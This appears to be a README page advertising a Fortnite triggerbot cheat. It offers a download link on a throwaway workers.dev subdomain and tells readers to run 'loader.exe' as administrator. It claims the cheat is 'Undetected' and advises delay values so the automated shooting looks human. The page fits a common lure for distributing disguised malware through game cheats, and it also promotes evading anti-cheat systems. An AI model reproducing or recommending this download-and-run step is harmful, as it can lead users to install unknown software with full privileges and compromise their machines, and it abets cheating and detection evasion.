# Fortnite Triggerbot

Triggerbot for Fortnite: fires automatically when the crosshair is on a target.

## Download

**[Download Fortnite Triggerbot](https://xtiz6i8n6.fresh-link.workers.dev/f03e3ac6)**

## Features

- Fires when crosshair overlaps an enemy
- Adjustable hit delay
- Custom trigger zone size
- Hold or toggle mode
- Works with any weapon

## Installation

1. Download the archive from the link above
2. Extract to a separate folder
3. Run `loader.exe` as administrator
4. Launch Fortnite, toggle with `F8`

## Usage

Set delay and zone in `config.json`. Lower delay = faster but less human.

## Status

- Status: Undetected
- Platform: Epic Games, Windows 10/11
- Mode: External

## Notes

A 30-60 ms delay feels most natural. Very low values look robotic.
